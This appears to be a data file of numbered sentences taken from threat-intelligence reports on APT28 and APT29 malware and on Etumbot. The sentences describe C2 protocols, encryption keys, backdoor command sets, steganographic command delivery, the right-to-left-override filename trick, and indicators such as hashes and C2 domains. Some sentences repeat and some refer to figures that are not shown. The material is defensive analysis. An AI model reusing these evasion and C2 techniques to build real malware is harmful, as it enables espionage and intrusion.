"551": "Baltic Host is a multinational logistics planning exercise , hosted annually since 2009 by one of the three Baltic States ( Estonia , Latvia , and Lithuania , all three of which are on Russia 's border ) on a rotational basis .", "552": "In June 2014 , this event was integrated with a larger U.S. Army training event , and focused on exercises to improve interoperability with regional allies and partners. , This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters .", "553": "Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships .", "554": "These exercises are a particular point of interest in Moscow : pro- Kremlin press cited Russia 's interpretation of these military exercises and NATO 's involvement as a '' sign of aggression , '' and Russia 's Foreign Minister publicly stated that the exercise was '' a demonstration of hostile intention .", "555": "'' APT28 's lures and domain registrations also demonstrate their interest in NATO and other European security organizations .", "556": "NATO remains a chief Russian adversary , or in the words of Russia 's 2010 military doctrine , a '' main external military danger '' particularly as it moves '' closer to the borders of the Russian Federation .", "557": "'' As the traditional western counterweight to the Soviet Union , Russia regards NATO , particularly NATO 's eastward expansion , as a threat to Russia 's strategic stability .", "558": "APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe ( OSCE ) , an intergovernmental organization that has cited widespread fraud in numerous Russian state elections .", "559": "Insider information about NATO , the OSCE and other security organizations would inform Russian political and military policy .", "560": "We also observed a user that we suspect works for NATO HQ submit an APT28 sample to VirusTotal , probably as a result of receiving a suspicious email .", "561": "APT28 also demonstrated an interest in defense attaches working in European countries .", "562": "In addition to targeting European security organizations and governments , it appears that APT28 is targeting attendees of European defense exhibitions .", "563": "'' Among other events , the SMi Group is currently planning a military satellite communications event for November 2014 .", "564": "Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies , as well as the victim organizations' operations , communications , and future plans .", "565": "APT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above .", "566": "However , we are not profiling all of APT28 's targets with the same detail because they are not particularly indicative of a specific sponsor 's interests .", "567": "They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests .", "568": "Other probable APT28 targets that we have identified : Our analysis of some of the group 's more commonly used tools indicates that APT28 has been systematically updating their malware since 2007 .", "569": "APT28 's tools are suggestive of the group 's skills , ambitions , and identity .", "570": "Our analysis of some of the group 's more commonly used tools indicates that APT28 has been systematically updating their tools since 2007 .", "571": "APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility , who make an effort to obfuscate their activity .", "572": "This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization , most likely a nation state government .", "573": "APT28 's malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours , which suggests that the Russian government is APT28 's sponsor .", "574": "\u2022 SOURFACE : This downloader is typically called Sofacy within the cyber security community .", "575": "CORESHELL is an updated version of SOURFACE .", "576": "\u2022 CHOPSTICK : This is a modular implant compiled from a software framework that provides tailored functionality and flexibility .", "577": "A number of the malware variants that we profile below , especially the CHOPSTICK family , demonstrate formal coding practices indicative of methodical , diligent programmers .", "578": "The modularity of CHOPSTICK alone , with its flexible and lasting platform , demonstrates planning for long-term use and versatility .", "579": "From a high level , these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations .", "580": "APT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007 .", "581": "These changes indicate a long-standing and dedicated development effort behind APT28 .", "582": "We have observed samples of the SOURFACE downloader compiled between 2007 and 2014 .", "583": "First , a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others .", "584": "There are exceptions : for example , some files contain public and standard code libraries that we do not take into consideration when making a family determination .", "585": "A malware ecosystem is a group of malware families that work together to perform the same objective .", "586": "Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together .", "587": "In April 2013 , based on compile time , the group began to make significant alterations to the SOURFACE downloader .", "588": "They started by changing the compiled DLL name to '' coreshell.dll '' and making minor changes to the network communications , as seen in Figure 7 .", "589": "The hostname , volume serial number and OS version data are encoded in the new URL format .", "590": "As seen in the table below , the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time .", "591": "In April 2013 , based on compile time , the group began to make significant alterations to the SOURFACE downloader .", "592": "Variants of the SOURFACE second stage backdoor , EVILTOSS , share some code similarities with SOURFACE .", "593": "Many of its variants we have seen are named netui.dll .", "594": "Interestingly , we found an antivirus report from 2004 detailing what appears to be an early variant of EVILTOSS .", "595": "Although we have not conclusively attributed this sample to APT28 , it does suggest the possibility that APT28 has been operating since as early as 2004 .", "596": "A modular development framework suggests the group has had an organized development effort since as early as 2007 .", "597": "We call this backdoor CHOPSTICK , a somewhat ironic name that comes from our semi-random name generator .", "598": "The modular design allows flexible options for compiling variants with different capabilities as needed , as well as deploying additional capabilities at runtime .", "599": "This allows the developers to make targeted implants , including only the capabilities and protocols necessary for a specific environment .", "600": "Such a modular framework suggests the group has had an organized development effort since as early as 2007 .", "601": "A formal development environment , in which code is versioned and well-organized , would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time .", "602": "CHOPSTICK variants may move messages and information using at least three methods : 1 .", "603": "These protocols are covered in more detail in Appendix D. 2 .", "604": "All information required for the email was hardcoded in the backdoor .", "605": "3 .", "606": "Local copying to defeat closed networks .", "607": "During our research into APT28 's malware , we noted two details consistent across malware samples .", "608": "The first was that APT28 had consistently compiled Russian language settings into their malware .", "609": "The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone , which includes major Russian cities such as Moscow and St. Petersburg .", "610": "PE resources include language information that can be helpful if a developer wants to show user interface items in a specific language .", "611": "Non-default language settings packaged with PE resources are dependent on the developer 's build environment .", "612": "Each PE resource includes a '' locale '' identifier with a language ID '' composed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region .", "613": "'' At the time of the writing of this paper , we had identified 103 malware samples that were both attributed to APT28 and contained PE resources .", "614": "Table 5 shows the locale identifiers with associated language and country/region for these samples .", "615": "The samples with Russian language settings were compiled between late 2007 and late 2013 , as depicted in Figure 9 .", "616": "This consistency over a long timeframe suggests that the developers of APT28 malware were using a build environment with Russian language settings at least some of the time and made no effort to obscure this detail .", "617": "Overall , the locale IDs suggest that APT28 developers can operate in both Russian and English .", "618": "Of the 140 malware samples that we have attributed to APT28 so far , over 89 % were compiled between 0400 and 1400 UTC time , as depicted in Figure 10 .", "619": "Over 96 % were compiled between Monday and Friday .", "620": "This parallels the working hours in UTC+0400 ( that is , compile times begin about 8AM and end about 6PM in this time zone ) .", "621": "This time zone includes major Russian cities such as Moscow and St. Petersburg .", "622": "We started researching APT28 based on activity we observed on our clients ' networks , similar to other targeted threat groups we have identified over time .", "623": "We assess that APT28 is most likely sponsored by the Russian government .", "624": "We summarize our key observations about APT28 in Figure 11 below .", "625": "APT28 's characteristics-their targeting , malware , language , and working hours-have led us to conclude that we are tracking a focused , long- standing espionage effort .", "626": "Given the available data , we assess that APT28 's work is sponsored by the Russian government .", "627": "We use the term '' threat group '' to refer to actors who work together to target and penetrate networks of interest .", "628": "These individuals may share the same set of tasks , coordinate targets , and share tools and methodology .", "629": "The art of attributing disparate intrusion activities to the same threat group is not always simple .", "630": "Different groups may use similar intrusion methodologies and common tools , particularly those that are widely available on the Internet , such as pwdump , HTran , or Gh0st RAT .", "631": "There may be overlaps between groups caused by the sharing of malware or exploits they have authored , or even the sharing of personnel .", "632": "Individual threat actors may move between groups either temporarily or permanently .", "633": "A threat actor may also be a private citizen who is hired by multiple groups .", "634": "Multiple groups , on occasion , compromise the same target within the same timeframe .", "635": "Distinguishing one threat group from another is possible with enough information , analytical experience , and tools to piece it all together .", "636": "We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another .", "637": "Threat actors leave behind various forensic details .", "638": "Their emails may contain certain patterns ; files have specific names , MD5 hashes , timestamps , custom functions , and encryption algorithms .", "639": "Their backdoors may have command and control IP addresses or domain names embedded .", "640": "These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another .", "641": "At the most basic level , we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved .", "642": "We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them .", "643": "In this way , we can always go back and answer '' why '' we associated cyber threat activity with a particular group .", "644": "Over time the downloader has evolved and the newer versions , usually compiled with the DLL name 'coreshell.dll ' , are distinct enough from the older versions that we refer to it as SOURFACE/CORESHELL or simply CORESHELL .", "645": "This appendix focuses on these newer versions .", "646": "The encryption algorithm is a custom stream cipher using a six-byte key .", "647": "CORESHELL has used the same user agent string ( '' MSIE 8.0 '' ) that SOURFACE previously used , but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system .", "648": "Figure 11 shows an example POST request .", "649": "When Base64 decoded , the POST content looks like this : The key used to encrypt the message is six bytes long and is appended to the end of the message .", "650": "In this is example the key would be : 30 ac e5 21 e4 a6 .", "651": "When the message is decrypted , the resulting plaintext is : The following table contains a breakdown of each of the field 's C2 message .", "652": "The command is identified by the NULL terminated UNICODE string '' OK '' ( O\\x00\\K\\x00\\x00\\ x00 ) .", "653": "The command is Base64 encoded and immediately follows the '' OK '' string .", "654": "Figure 12 shows a sample CORESHELL command : The Base64 decoded string is : The following table contains a description of each field in the command message : When the above command '' 10 41 70 41 10 42 33\u2026 '' is decrypted using the key '' 01 01 01 01 01 01 01 01 '' the following command message is produced : The implant supports the following four command identifiers from the controller as seen in Table 8 .", "655": "The first byte of the command message specifies the command type and is immediately followed by the PE or shellcode to be executed .", "656": "In this example the command byte is 04 indicating the following bytes are shellcode .", "657": "This framework allows for a diverse set of capabilities across malware variants sharing a common code base .", "658": "This appendix documents variants using HTTP communications .", "659": "The user HKU\\S-1-5-19 corresponds to the LOCALSERVICE account SID .", "660": "The key is a combination of a 50-byte static key and a four-byte salt value randomly generated at runtime .", "661": "The static key is derived from opcodes in the backdoor .", "662": "The RC4 encryption used here also uses a 50- byte static key plus four-byte random salt value .", "663": "It does not wait for a response from the server to begin uploading .", "664": "Each HTTP request contains multiple Base64 encoded URL parameters , however only one parameter contains information encoded by the malware ( '' ai= '' ) and the rest of the URL parameters appear to be randomly generated per request .", "665": "The Base64 encoded text of this parameter begins with a number of randomly generated alphabetical characters presumably intended to prevent people from Base64 decoding the whole string without some knowledge of how the malware family works .", "666": "The first four bytes of the message are an XOR key for the remainder of the data .", "667": "Once decrypted using the XOR key , an 11-byte sequence is revealed .", "668": "The first seven bytes are static , and are hard-coded in CHOPSTICK , while the last four bytes appear to be unique .", "669": "This encoded string is also prefixed with random characters designed to break the output of a Base64 decode operation on the entire string .", "670": "The first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence stored in the '' ai= '' parameter as described above .", "671": "Decrypting these bytes yields another static seven-byte sequence , followed by four unique bytes .", "672": "The remainder of the message body consists of the RC4 encrypted data containing the HTML-formatted user activity log , edg6EF885E2.tmp .", "673": "CHOPSTICK backdoors are compiled within a modularized development framework .", "674": "This means that two separate CHOPSTICK backdoors may contain vastly different functionality , depending on which modules were included at compile time .", "675": "Figure 14 includes an example from a CHOPSTICK v1 variant : To decode the POST content , the first step is to remove characters from the Base64 string ( the number of characters to remove may vary between different communication channels ) .", "676": "In the example from Figure 14 , the number of characters removed is seven .", "677": "The next 4 bytes '' f8 dc 33 9e '' are a salt value that is appended to the end of an RC4 key .", "678": "Once decrypted , the message looks like the following : The strings '' V4MGNxZWlvcmhjOG9yZQ '' and '' = < < \\xee '' are hardcoded in the implant .", "679": "The module information starts at offset 0x20 with the string '' 01 00 00 '' and is formatted as follows : The modules included in this CHOPSTICK v1 implant are : Our determination of a CHOPSTICK '' v1 '' versus '' v2 '' is based on the self-identification of the kernel ID and associated modules .", "680": "Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules in an example CHOPSTICK v2 variant in Table 13 : The kernel IDs 0x0001 and 0x0002 indicate different versions .", "681": "The corresponding modules in each backdoor also are consistently identified with 0x01 and 0x02 , respectively , in the second byte .", "682": "In both variants the modules with keystroke log , file system access , and command shell capabilities have the consistent identifiers 0x10 , 0x11 , and 0x13 , respectively , in the first byte .", "683": "This suggests that the first byte in the module ID identifies the module type whereas the second byte identifies the kernel version .", "684": "The kernel sends commands to each module using its module ID .", "685": "The commands that each module understands are likely consistent from build to build .", "686": "Table 14 and Table 15 show examples of commands that each module understands .", "687": "There is a missing space in the MediaPlayer directory and the filename is missing the 'o ' character .", "688": "Sample HTTP traffic is displayed in Figure 15 .", "689": "OLDBAIT handles APIs very similarly to SOURFACE and EVILTOSS .", "690": "There is a setup routine that loads the imports into a table and all API calls reference an index to this table .", "691": "In SOURFACE and EVILTOSS the table is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is passed between functions .", "692": "T he Russian cyber threat groups that we monitor frequently design innovative ways to cover their tracks .", "693": "In early 2015 , we came across stealthy malware - which we call HAMMERTOSS - from an advanced persistent threat group that we suspect the Russian government sponsors .", "694": "We designate this group APT29 .", "695": "Using a variety of techniques - from creating an algorithim that generates daily Twitter handles to embedding pictures with commands - the developers behind HAMMERTOSS have devised a particularly effective tool .", "696": "HAMMERTOSS uses Twitter , GitHub , and cloud storage services to relay commands and extract data from compromised networks .", "697": "Using a variety of techniques - from creating algorithms that generate daily Twitter handles to embedding pictures with commands - the developers behind HAMMERTOSS have devised a particularly effective tool .", "698": "HAMMERTOSS works by .", "699": "While none of these tactics are new , the combination of these techniques piqued our interest .", "700": "KALININGRAD TIME MOSCOW TIME SAMARA TIME YEKATERINBURG TIME OMSK TIME KRASNOYARSK TIME IRKUTSK TIME YAKUTSK TIME VLADIVOSTOK TIME SREDNEKOLYMSK TIME KAMCHATKA TIME ( UTC + 02/MSK-1 ) ( UTC + 03/MSK ) ( UTC + 04/MSK+1 ) ( UTC + 05/MSK+2 ) ( UTC + 06/MSK+3 ) ( UTC + 07/MSK+4 ) ( UTC + 08/MSK+5 ) ( UTC + 09/MSK+6 ) ( UTC + 10/MSK+7 ) ( UTC + 11/MSK+8 ) ( UTC + 12/MSK+9 ) APT29 has been operating in its current form since at least late 2014 .", "701": "We suspect the Russian government sponsors the group because of the organizations it targets and the data it steals .", "702": "Additionally , APT29 appeared to cease operations on Russian holidays , and their work hours seem to to align with the UTC + 3 time zone , which contains cities such as Moscow and St.", "703": "Petersburg .", "704": "While other APT groups try to cover their tracks to thwart investigators , very few groups show the same discipline and consistency .", "705": "Similarly , few groups display the ability to adapt to network defenders ' attempts to mitigate its activity or remove it from victim networks .", "706": "For example , APT29 almost always uses anti - forensic techniques , and they monitor victim remediation efforts to subvert them .", "707": "These aspects make APT29 one of the most capable APT groups that we track .", "708": "5 W e first identified HAMMERTOSS in early 2015 .", "709": "APT29 likely used HAMMERTOSS as a backup for their two primary backdoors to execute commands and maintain access if the group 's principal tools were discovered .", "710": "We have identified two HAMMERTOSS variants that give APT29 alternative ways to communicate with the malware .", "711": "The developer appears to name these variants uploader and tDiscoverer.1 Both variants are written in the C # programming language .", "712": "We will focus on tDiscoverer in this report .", "713": "Five Stages of HAMMERTOSS We have broken down the malware communication process into five stages to explain how the tool operates , receives instructions , and extracts information from victim networks .", "714": "The stages include information on what APT29 does outside of the compromised network to communicate with HAMMERTOSS and a brief assessment of the tool 's ability to mask its activity .", "715": "6 < heaading > STAGE 1 : < /heading > The Communication Process Begins with Twitter H AMMERTOSS first looks for instructions on Twitter .", "716": "The malware contains an algorithm that generates a daily Twitter handle , which is an account user ID .", "717": "To create the handles , the algorithm employs a basename , such as \" Bob , \" and appends and prepends three CRC32 values based on the date .", "718": "For example , \" 1abBob52b \" would have the URL : hxxps://twitter.com/1abBob52b .", "719": "Each HAMMERTOSS sample will create a different Twitter handle each day .", "720": "APT29 knows the algorithm used to generate the handles and chooses to register a Twitter handle and post obfuscated instructions to the handle 's URL before the malware attempts to query it .", "721": "If a particular day 's handle is not registered and the URL for that day is not found , HAMMERTOSS will wait until the next day to attempt to communicate with another handle .", "722": "APT29 typically configures HAMMERTOSS to communicate within certain restrictions , such as only checking the Twitter handle on weekdays or after a specified start date .", "723": "This allows the malware to blend in to \" normal \" traffic during the victim 's work week or to remain dormant for a period of time before activating .", "724": "7 Tweeting a URL , Minimum File Size of an Image , and Part of an Encryption Key I f APT29 has registered that day 's Twitter handle , they will tweet a URL and a hashtag .", "725": "The URL directs HAMMERTOSS to a webpage containing an image or images .", "726": "The hashtag provides a number representing a location within the image file and characters for appending to an encryption key to decrypt instructions within the image .", "727": "In the mockup of a HAMMERTOSS tweet in Figure 2 , the hashtag was # 101docto , indicating that the encrypted data begins at an offset of 101 bytes into the image file , and the characters docto should be added to the encryption key to decrypt the data .", "728": "In Figure 3 is a sample of the HAMMERTOSS tDiscoverer variant and a corresponding snapshot of a Twitter account page from one of its generated handles .", "729": "At the time of publication , a publicly available HAMMERTOSS sample had only five generic detections in VirusTotal .", "730": "The Twitter account was active and contained a link to a website .", "731": "HIDING AMONG UNREGISTERED TWITTER ACCOUNTS H AMMERTOSS uses an algorithm to generate hundreds of Twitter handles annually for potential CnC.", "732": "Many of these are unregistered , as APT29 chooses to register a particular day 's handle as needed and ahead of an anticipated HAMMERTOSS beacon .", "733": "This small number of registered accounts allows the group to maintain a small footprint .", "734": "9 Visiting GitHub to Download an Image H AMMERTOSS then uses the InternetExplorer .", "735": "Application COM Object to visit the URL specified in a tweet .", "736": "We have observed URLs lead to specific GitHub accounts or compromised websites .", "737": "We will use Github for the next part in our example .", "738": "Once HAMMERTOSS obtains the GitHub URL from its daily Twitter account , it visits the URL and downloads the contents of the page , including any image files .", "739": "APT29 Employs Basic Steganography H AMMERTOSS downloads the contents of the website to Internet Explorer 's browser cache and searches the cache for any images at least as large as the offset specified in the tweet from Stage 2 .", "740": "While the image appears normal , it actually contains steganographic data .", "741": "Steganography is the practice of concealing a message , image , or file within another message , image , or file .", "742": "In this case , the image contains appended and encrypted data that HAMMERTOSS will decrypt and execute .", "743": "HAMMERTOSS locates the encrypted data at the offset specified in the tweet in Stage 2 .", "744": "It decrypts the data using a key comprised of hard - coded data from the malware binary appended with the characters from the tweet .", "745": "APT29 ADDING STEGANOGRAPHY AS ANOTHER LAYER OF OBFUSCATION We have observed only a few APT groups using steganography .", "746": "HAMMERTOSS uses steganography by appending data to an image file after the image 's end of file marker .", "747": "This technique would be readily detectable if someone was checking for it .", "748": "However , the appended data is encrypted , so even if detected , the investigator would be unable to decrypt the data without key material from two sources : the malware binary and the current tweet .", "749": "the group ensures that if network defenders discover the images , the defenders still require the malware sample , corresponding Twitter handle , and tweet with the additional key material to decrypt the tool 's instructions .", "750": "All of the samples we have observed have used Indicative of APT29 's discipline , different encryption keys to decrypt the appended content .", "751": "Executing Commands and Uploading Victim Data APT29 's operator creates the cloud storage account and can obtain the victim 's data from the cloud storage service .", "752": "APT29 can then easily obtain the extracted information from the cloud storage service at their convenience .", "753": "Difficulty Identifying Accounts , Discerning Legitimate and Malicious Traffic , and Locating the Payload H AMMERTOSS undermines network defenders ' ability to identify Twitter accounts used for CnC , discern malicious network traffic from legitimate activity , and locate the malicious payloads downloaded by the malware .", "754": "For example , if an organization blocks access to GitHub , APT29 could easily redirect HAMMERTOSS to download an image with encrypted instructions from another website .", "755": "Similarly , if an organization starts monitoring Twitter activity on their network , APT29 could easily switch to using the Uploader variant of HAMMERTOSS , which does not use Twitter and communicates directly to a specified URL .", "756": "If an organization identifies the handle generation algorithm and attempts to research old Twitter accounts , tweets , or secondary URLs , APT29 could easily delete previously used accounts or the locations where images were stored .", "757": "While each technique in HAMMERTOSS is not new , APT29 has combined them into a single piece of malware .", "758": "Individually , each technique offers some degree of obfuscation for the threat group 's activity .", "759": "In combination , these techniques make it particularly hard to identify HAMMERTOSS or spot malicious network traffic ; determine the nature and purpose of the binary ; discern the malware 's CnC method and predict its CnC accounts ; capture and decode second - stage CnC information ; and pinpoint and decrypt the image files containing malware commands .", "760": "This makes HAMMERTOSS a powerful backdoor at the disposal of one of the most capable threat groups we have observed .", "761": "To download this or other FireEye Threat Intelligence reports , visit : https://www.fireeye.com/reports.html FireEye , Inc.", "762": "| 1440 McCarthy Blvd .", "763": "Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com 2015 FireEye , Inc.", "764": "All rights reserved .", "765": "FireEye is a registered trademark of FireEye , Inc.", "766": "All other brands , products , or service names are or may be trademarks or service marks of their respective owners .", "767": "SP.APT29.EN - US.072015", "768": "Arbor Threat Intelligence Brief 2014 - 07 ASERT Threat Intelligence , June 2014 Etumbot is a backdoor used in targeted attacks since at least March 2011 .", "769": "Although previous research has covered a related family , IXESHE , little has been discussed regarding Etumbot 's capabilities .", "770": "ASERT has observed several Etumbot samples using decoy documents involving Taiwanese and Japanese topics of interest , indicating the malware is used in ongoing , targeted campaigns .", "771": "This report will provide information on the capabilities of Etumbot and associated campaign activity .", "772": "Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively known as \" Numbered Panda \" , APT12 , DYNCALC / CALC Team , and IXESHE .", "773": "Targeted campaigns attributed to this group include attacks on media , technology companies , and governments .", "774": "IXESHE / Numbered Panda is known for using screen saver files ( .scr ) , a technique repeated with the Etumbot malware .", "775": "The group has reportedly been active since at least July 2009 .", "776": "[ 2 ] Etumbot has also been referred to as Exploz [ 3 ] and Specfix .", "777": "The variety of names for this malware could lead to some confusion about the actual threat .", "778": "ASERT has associated Etumbot with IXESHE , and therefore Numbered Panda , based on similar system and network artifacts that are common between the malware families .", "779": "Etumbot has two primary components .", "780": "Stage one is likely delivered via spear phish using an archive file extension such as .7z to deliver executable content .", "781": "Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .", "782": "As with the IXESHE malware , Etumbot has been observed dropping documents of interest to a Taiwanese and Japanese target population .", "783": "To profile the techniques and capabilities of Etumbot , we will analyze an Etumbot dropper with MD5 ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4 , 2014 .", "784": "This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .", "785": "JavaSvc.exe is executed with CreateProcessInternalW.", "786": "The backdoor component of the malware ( named here as JavaSvc.exe ) is now running .", "787": "It is interesting to note that versions of the IXESHE malware also used JavaSvc.exe as a filename .", "788": "Several decoy files contain details on upcoming conferences in Taiwan .", "789": "Etumbot appears to be sent to targets via spear phishing emails as an archive ; ASERT has observed .7z and .rar formats being used to presumably deliver the Etumbot installer .", "790": "The archive filename will have a topic most likely of interest to the victim .", "791": "At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 , compiled in March 2014 ) uses a password - protected .7z to deliver the Etumbot installer .", "792": "It is most likely that the spear phish email contained the password .", "793": "With the correct password , the victim has access to the dropper inside the archive .", "794": "This archive most likely included the installer d444be30d2773b23de38ead1f2c6d117 , as the filenames match ( 1030522 \u65b0 \u6a5f\u95dc\u7c4c\u5099\u5c0f\u7d44\u6e05\u55ae.7z and 1030522 \u65b0\u6a5f\u95dc\u7c4c\u5099\u5c0f\u7d44\u6e05\u55ae rcs . DOC ) .", "795": "1030522 is a date ( May 22 , 2014 ) from the Minguo calendar , which is unique to Taiwan .", "796": "The calendar is based on the establishment of the rd Republic of China in 1911 .", "797": "2014 is therefore the \" 103 \" year of the ROC .", "798": "The installer is a .scr binary posing as a Word Document .", "799": "This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .", "800": "Right - to - Left Override After the files are extracted from the archive , the filenames of Etumbot installers make use of the right - to - left override ( RTLO ) trick in an attempt to trick users into clicking on the installer .", "801": "The RTLO technique is a simple way for malware writers to disguise names of malicious files .", "802": "A hidden Unicode character in the filename will reverse the order of the characters that follow it , so that a .scr binary file appears to be a .xls document , for example .", "803": "Threat actors using this trick have been well documented since at least 2009 .", "804": "[ 4- 5 ] One way to avoid this trick in Windows is to set the \" Change your view \" level to \" Content \" .", "805": "[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully .", "806": "These temp files appear to be static and used across multiple samples of Etumbot and IXESHE .", "807": "Various other samples were found using this same naming scheme .", "808": "If Word is n't installed , then notepad will open the file instead .", "809": "The beacon takes the form of a GET request to /home / index.asp?typeid = N where N is a randomly selected odd number between 1 and 13 .", "810": "If the C&C does not send a valid response , the bot will re - send the initial request every 45 seconds .", "811": "While the user - agent may appear to be legitimate , it only occurred 39 times in a corpus of over 61 million HTTP requests .", "812": "Due to the possibility of this User - Agent appearing in legitimate traffic , other indicators \u2013 such as the additional fake Referer value of http://www.google.com should be present before compromise is assumed .", "813": "All of the headers in the HTTP request are hard - coded in both order and value , so they may be used to provide additional indicators of compromise .", "814": "Etumbot uses a url - safe base64 alphabet , i.e. , any characters that would require URL - encoding are replaced .", "815": "Usage of base64 is a technique consistent with previous analysis done on IXESHE malware .", "816": "[ 2,7 ] In the case of Base64 , the \" / \" and \" = \" characters are replaced with \" _ \" and \" - \" respectively .", "817": "The payload from the C&C contains an 8-byte command code in little - endian format , followed by a null - terminated string argument if the command requires it .", "818": "In the case of the initial beacon response , the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C&C 's that ASERT has analyzed .", "819": "An example of this initial beacon and delivery of RC4 key is as follows .", "820": "The RC4 key can be obtained from the C&C response with the following python .", "821": "While a payload of 1080 bytes is sent back , the majority appears to be random padding .", "822": "IXESHE malware has also been observed using a unique campaign code that is delivered back to the C&C.", "823": "If a proxy is defined , communications to the C&C bypass the proxy and go directly to the Internet .", "824": "Environments with system - defined proxies wo n't get this activity in proxy logs , however transparent proxies may see this activity .", "825": "A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows .", "826": "The URI for the ping requests is /history/<encrypted NetBIOS name>.asp , where encrypted NetBIOS name is the url - safe base64 encoding of the rc4-encrypted NetBIOS name .", "827": "The first eight bytes of C&C responses to the bot include the command , and the second eight bytes contain an ASCII string that is parsed .", "828": "In the event of a file download , file upload , or command execution , the second eight bytes contain the filename or command to be executed .", "829": "The parsing function inside the binary reveals at least five commands .", "830": "ETUM_CMD_EXEC provides the capability for the attacker to run any command on the compromised hosts .", "831": "Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the C&C using a separate thread that spawned during initialization .", "832": "In the event of a process creation or hang error , an HTTP transaction to /tech / s.asp / m=<message > is sent to the C&C , where < message > contains a create process error statement \" CreateProcess Error : % d \" or a message that states \" Process Do not exit in 10 second , so i Kill it ! \" .", "833": "Some samples of droppers have been observed using the string \" Process Do not cunzai in 10 second , so i Kill it ! \" .", "834": "The word \" cunzai \" is likely the pinyin ( romanization ) for the Mandarin word ' exist ' .", "835": "ETUM_CMD_PUTFILE provides the capability for files to be placed on local system from the C&C.", "836": "The file upload is accomplished by sending a request to /docs / name=<data > and the C&C is expected to respond with the full contents of the file as the response payload .", "837": "A success or failure status message is relayed via a call to /tech / s.asp?m=<encrypted status message > with various reasons for failure potentially being relayed .", "838": "ETUM_CMD_READFILE allows any file from the compromised system to be uploaded to the C&C.", "839": "Data from the file is read in 2000 byte chunks , RC4 encrypted and then url - safe base64 encoded .", "840": "A success or failure message is sent via the /tech / s.asp?m=<encrypted status message > to complete or terminate the upload .", "841": "ETUM_CMD_SLEEP puts the bot into a dormant state for a period of time .", "842": "When a bot receives the sleep command , it will relay the message , \" I will sleep % d minutes ! \" via a call to /tech / s.asp?m=<encrypted message>.", "843": "ETUM_CMD_UNINSTALL deletes the binary and terminates the process with no additional communication to the C&C.", "844": "Assuming the string values do not change frequently , these byte strings can make for meaningful detection capabilities , such as discovering an unusual combination of characters ( to include typos , unique or odd syntax ) being loaded into memory that creates a unique fingerprint for the malware activity that can be used as part of a yara rule or other detection mechanism .", "845": "The byte string technique has been observed in various Chinese APT malware , including Gh0st RAT , IXESHE malware , Etumbot and others .", "846": "ASERT has provided an IDApython script that will provide for cleaner analysis of such strings as well as a corresponding blog entry that describes the obfuscation technique and code .", "847": "[ 8 - 9 ] The output of running find_byte_strings.py on an Etumbot backdoor shows the string \" I 'm Ready \" which is involved in file transfer routines .", "848": "The first screenshot shows the default hex byte values that are MOVed into offsets from EBP , and the second screenshot shows those same characters after translation to string values .", "849": "Two additional screenshots provide insight into all of the strings discovered .", "850": "The byte string technique has also been observed in other malware , so its presence alone does not specifically indicate the activities of Chinese threat actors .", "851": "An interesting artifact occasionally observed during analysis is the presence of a numeric value just after an IP address used as a C&C.", "852": "The placement of this number after a colon suggests the use of a port value , however such a port value is too high to be valid .", "853": "An example of this taken from an Etumbot sample performing an initial beacon is as follows .", "854": "11 Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address hardcoded in the binary .", "855": "These C&C 's were obtained from analyzing malware samples compiled over a period of several years .", "856": "A number of these C&C IP addresses are also used by IXESHE - related malware , which seems to indicate that Etumbot is often used in tandem with IXESHE .", "857": "The domain finance[.]yesplusno[.]com and IP address 211[.]53.164.152 was also used by a variety of IXESHE samples , for instance .", "858": "The registrant for the domain yesplusno[.]com is listed as \" alice yoker \" wit the email address \" chuni_fan@sina.com \" .", "859": "Other domains registered in this name have also been used as C&C for IXESHE .", "860": "This is the IP address for what appears to be a legitimate website for a school in Taiwan : intro.sunnyschool.com.tw .", "861": "Note that if HTran or other connection bouncer is used , the C&C may be a legitimate site that was simply compromised and used to direct traffic elsewhere .", "862": "Indicators suggest that HTran , a connection bouncer , is being used in some cases such as on the C&C contacted by malware sample MD5 : 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 , 2014 ) .", "863": "The presence of HTran is based on the following response string HTran is also called \" HUC Packet Transmit Tool \" , developed by a member of the Honker Union of China , a hacker group ; the source code for the program is available online .", "864": "[ 11 ] HTran is designed to redirect TCP traffic intended for one host to another , and has been used by IXESHE malware previously .", "865": "[ 2 ] Researchers at SecureWorks determined some years back that 